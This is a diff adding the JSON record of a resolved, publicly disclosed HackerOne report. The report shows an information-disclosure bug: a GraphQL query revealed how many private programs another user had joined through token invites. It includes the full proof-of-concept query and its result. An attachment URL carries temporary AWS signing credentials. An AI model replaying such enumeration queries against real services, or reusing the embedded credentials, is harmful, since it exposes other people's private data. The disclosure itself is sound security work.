@@ -1,0 +1,139 @@
+{
+  "id": 310946,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTA5NDY=",
+  "url": "https://hackerone.com/reports/310946",
+  "title": "The request tells the number of private programs, the new system of authorization /invite/token",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-31T13:41:42.467Z",
+  "submitted_at": "2018-01-31T13:41:42.467Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "haxta4ok00",
+    "url": "/haxta4ok00",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/o042lvw70gzlwr2g2fp2rzzek78y/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-02-14T09:25:56.318Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-02-14T09:25:56.198Z",
+  "team_member_agreed_on_going_public_at": "2018-02-14T09:12:40.744Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nHi team.\nThe old version of the invite program, looks simple. A link to the program in which you need to log in.Now this looks through token.So my PoC I think you can count work since you have changed the system to a new, token\n\n**Description:**\n\n### Steps To Reproduce\n\n1. https://hackerone.com/graphql\n\nPOST:\n`{\"query\":\"query Directory_invitations_page($state_0:[InvitationStateEnum]!,$state_3:[InvitationStateEnum]!,$first_1:Int!,$size_2:ProfilePictureSizes!) {\\\\n`***user(username:\\\\\\\"jobert\\\\\\\")***` {\\\\n    id,\\\\n    ...F5\\\\n  }\\\\n}\\\\nfragment F0 on User {\\\\n  _soft_launch_invitations259p9N:soft_launch_invitations(state:$state_0,first:$first_1) {\\\\n    total_count\\\\n  },\\\\n  id\\\\n}\\\\nfragment F1 on InvitationsSoftLaunch {\\\\n  id,\\\\n  team {\\\\n    handle,\\\\n    url,\\\\n    name,\\\\n    about,\\\\n    bug_count,\\\\n    base_bounty,\\\\n    offers_bounties,\\\\n    currency,\\\\n    _profile_picture2rz4nb:profile_picture(size:$size_2),\\\\n    id\\\\n  },\\\\n  expires_at,\\\\n  state,\\\\n  token\\\\n}\\\\nfragment F2 on Node {\\\\n  id,\\\\n  __typename\\\\n}\\\\nfragment F3 on InvitationInterface {\\\\n  __typename,\\\\n  ...F1,\\\\n  ...F2\\\\n}\\\\nfragment F4 on User {\\\\n  _soft_launch_invitations1WD3Qk:soft_launch_invitations(state:$state_0,first:$first_1) {\\\\n    total_count,\\\\n    edges {\\\\n      node {\\\\n        id,\\\\n        ...F3\\\\n      },\\\\n      cursor\\\\n    },\\\\n    pageInfo {\\\\n      hasNextPage,\\\\n      hasPreviousPage\\\\n    }\\\\n  },\\\\n  _soft_launch_invitations2FRMOR:soft_launch_invitations(state:$state_3,first:$first_1) {\\\\n    total_count\\\\n  },\\\\n  id\\\\n}\\\\nfragment F5 on User {\\\\n  id,\\\\n  ...F0,\\\\n  ...F4\\\\n}\",\"variables\":{\"state_0\":[\"pending_terms\",\"open\",\"accepted\"],\"state_3\":[\"pending_terms\",\"open\",\"accepted\",\"cancelled\",\"rejected\"],\"first_1\":100,\"size_2\":\"large\"}}`\n\n\nI take username:\\\\\\\"jobert\\\\\\\" , hi @jobert\n\n`Result \"total_count\":27`\n\nYou have 27 private programs in which you have added through the new system - using /invite/token\n\nYes , most likely you have more number of private programs, but those that are missing, you most likely added by the old system.\n\nSorry i bad speak english\nI hope you understand me\nThank you,haxta4ok00\n\nF259145\n\n## Impact\n\ntotal count Private programs in order to add the system /invite/token",
+  "bounty_amount": "2000.0",
+  "formatted_bounty": "$2,000",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 259145,
+      "file_name": "asdqwe.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/259/145/6b4bf314e11d81c3c6ec89411ee5299d75947b6b/asdqwe.png?response-content-disposition=attachment%3B%20filename%3D%22asdqwe.png%22%3B%20filename%2A%3DUTF-8%27%27asdqwe.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2GP7HMFG%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T185548Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIC8jztlqtCc0i9dbbkiSdXFALVKPJZj2c2z%2F1QYNv5b4AiBq9He%2BoiwdnmQQaFYTCJT5LewmOqqL%2FhWbHyNqBRtdPyqxBQgbEAMaDDAxMzYxOTI3NDg0OSIM63%2F2yEnJ9MV98oaKKo4FyduVdprPRpbG1L28OQBKqTOvAtzvP7NldVpXh7EucwjXxZizj3%2BxZ8fURdajJhEyBL6uLzhLA1n3yJRSuXFJIw8oOnh13cUPWHByKVwfPOho%2B0GQKqQgr3EkY9PEakA0pM%2F09Kztibn66yQSsg3XDDatnV6AGKprKkcJm%2BgXCAxNjQNzlzqNdtUdZ2eMWVKGvqOrP4cHy8k5NIBP1s9SRJOiPbmmi1OMtS0PlocFyoguje1dKtFPtGjXzK7xt4%2Fx7YCvpJHIyQq9%2BV42WIRrHm%2BZDn7qqdmGa9zkT7C1Y5Wc9mjYgsAslvKr2LZ9MQOz%2F8Oro0ZP1TGpcQUEPq9Uhwes1mPQkEn%2FbDJobZDJJJaYSe6vh%2B3Nwk2Sm%2Bl9I3gO0BeSTksZDOlzm3p5DuhbEobKVkwLyLINfpP9PSq6xVennmPLWcwZRCW%2FcAUV2PwS1ZjOHSNV9SW717IQW%2B73wXeETGIEzP0o07sgYhWP65sLR%2BgLhABEGVZLsXTW3ZXaodyQuVlNt2gHwjRl1%2Fun06cN5teJf4OmwIIYSF34q4ZhigD0yIw4zD6JuW9%2B3WmR1GEjFwNj%2BmPNx6EtxaDIv57rwMFNZgzdHs%2B%2BF5eBOUQtjx620jxNqh%2B9IUNKSh3y7vYvkG4KexXHQEPR3ZBeViY7xLLaVHYFa0X38xYG1dqEuD%2F3M%2BNNs2tXNt084EQ%2BDnmK4YLb%2ByTBDUXaEkCP8xnznYFEQHakJiQyRk4CNaIBQ89zE9mKUTmXAYTVNN6SYUBlI5cuiuOUxb%2B2cT1TjImGWkLwwukFp6FmV47FHrkOIwdBmEti3q2SzlxDPENS0Vfl%2FyRAxKyj2lJFXqlC6yYLkcVwZ4K3ejIe9hTyMJnvwMYGOrIBceE1o%2FaBUOQoPHkb3%2BXhLGI%2FV4FBJt6lE76LX2BVH3v3mfUcl4%2BSe02Kyb%2Bo4imiWefYbxVLe9DZAyWzGKBy5tkX3TT9Cws3fISf%2B1rxaDQa3DcIesetBvy8lOP%2FU8B4Bt9m1F%2F9U%2BZn9TC4d1j1SMCFdqex71hbzSuEfts5RJkoqsMKEU2c0eCjeLCaAOQ%2FfvBDxVgh%2Fx%2Bdr6YUC7QbUhJlcbm2Vb2Ulp9pr9XKJooshQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1450f989ad7faee628dff6d3a68030bf0de5dc903df5a476a11454f0a7ce2e6e",
+      "file_size": 168593,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-03-16T09:12:40.903Z",
+  "allow_singular_disclosure_after": -237289387.31677184,
+  "singular_disclosure_allowed": true,
+  "vote_count": 71,
+  "voters": [
+    "jokebookservice1",
+    "jin",
+    "loaymorad",
+    "jensec",
+    "fng",
+    "mashoud1122",
+    "europa",
+    "bogdantc",
+    "kapytein",
+    "heeeeen",
+    "and 61 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
